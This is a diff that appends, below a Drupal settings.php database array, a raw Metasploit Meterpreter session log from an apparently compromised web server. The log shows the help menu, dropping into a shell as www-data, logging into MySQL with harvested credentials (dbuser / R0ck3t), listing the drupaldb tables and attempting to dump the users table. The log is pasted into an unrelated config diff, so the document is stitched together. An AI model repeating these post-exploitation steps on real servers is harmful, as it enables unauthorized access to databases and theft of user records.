@@ -605,4 +605,232 @@ $databases = array (
   ),
 );
 
+
+eterpreter > sql
+[-] Unknown command: sql. Run the help command for more details.
+meterpreter > mysql
+[-] Unknown command: mysql. Run the help command for more details.
+meterpreter > bash
+[-] Unknown command: bash. Run the help command for more details.
+meterpreter > sh
+[-] Unknown command: sh. Run the help command for more details.
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command                   Description
+    -------                   -----------
+    cat                       Read the contents of a file to the screen
+    cd                        Change directory
+    checksum                  Retrieve the checksum of a file
+    chmod                     Change the permissions of a file
+    cp                        Copy source to destination
+    del                       Delete the specified file
+    dir                       List files (alias for ls)
+    download                  Download a file or directory
+    edit                      Edit a file
+    getlwd                    Print local working directory (alias for lpwd)
+    getwd                     Print working directory
+    lcat                      Read the contents of a local file to the screen
+    lcd                       Change local working directory
+    ldir                      List local files (alias for lls)
+    lls                       List local files
+    lmkdir                    Create new directory on local machine
+    lpwd                      Print local working directory
+    ls                        List files
+    mkdir                     Make directory
+    mv                        Move source to destination
+    pwd                       Print working directory
+    rm                        Delete the specified file
+    rmdir                     Remove directory
+    search                    Search for files
+    upload                    Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command                   Description
+    -------                   -----------
+    arp                       Display the host ARP cache
+    portfwd                   Forward a local port to a remote service
+    resolve                   Resolve a set of host names on the target
+
+
+Stdapi: System Commands
+=======================
+
+    Command                   Description
+    -------                   -----------
+    execute                   Execute a command
+    getenv                    Get one or more environment variable values
+    getpid                    Get the current process identifier
+    getuid                    Get the user that the server is running as
+    kill                      Terminate a process
+    localtime                 Displays the target system local date and time
+    pgrep                     Filter processes by name
+    pkill                     Terminate processes by name
+    ps                        List running processes
+    shell                     Drop into a system command shell
+    sysinfo                   Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command                   Description
+    -------                   -----------
+    play                      play a waveform audio file (.wav) on the target system
+
+For more info on a specific command, use <command> -h or help <command>.
+
+meterpreter > shell
+Process 3236 created.
+Channel 2 created.
+ls
+default.settings.php
+files
+settings.php
+mysql
+ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
+mysql -u dbuser -p R0ck3t
+Enter password: R0ck3t
+ERROR 1044 (42000): Access denied for user 'dbuser'@'localhost' to database 'R0ck3t'
+mysql -u dbuser -p drupaldb 
+Enter password: R0ck3t
+show tables;
+use
+ERROR at line 2: USE must be followed by a database name
+use drupaldb;
+show databases;
+exit
+Tables_in_drupaldb
+actions
+authmap
+batch
+block
+block_custom
+block_node_type
+block_role
+blocked_ips
+cache
+cache_block
+cache_bootstrap
+cache_field
+cache_filter
+cache_form
+cache_image
+cache_menu
+cache_page
+cache_path
+cache_update
+cache_views
+cache_views_data
+comment
+ctools_css_cache
+ctools_object_cache
+date_format_locale
+date_format_type
+date_formats
+field_config
+field_config_instance
+field_data_body
+field_data_comment_body
+field_data_field_image
+field_data_field_tags
+field_revision_body
+field_revision_comment_body
+field_revision_field_image
+field_revision_field_tags
+file_managed
+file_usage
+filter
+filter_format
+flood
+history
+image_effects
+image_styles
+menu_custom
+menu_links
+menu_router
+node
+node_access
+node_comment_statistics
+node_revision
+node_type
+queue
+rdf_mapping
+registry
+registry_file
+role
+role_permission
+search_dataset
+search_index
+search_node_links
+search_total
+semaphore
+sequences
+sessions
+shortcut_set
+shortcut_set_users
+system
+taxonomy_index
+taxonomy_term_data
+taxonomy_term_hierarchy
+taxonomy_vocabulary
+url_alias
+users
+users_roles
+variable
+views_display
+views_view
+watchdog
+Database
+information_schema
+drupaldb
+select * from users;
+/bin/sh: 5: select: not found
+mysql -u dbuser -p drupaldb
+Enter password: R0ck3t
+use drupaldb;
+select * from users;
+
+
+
 ```
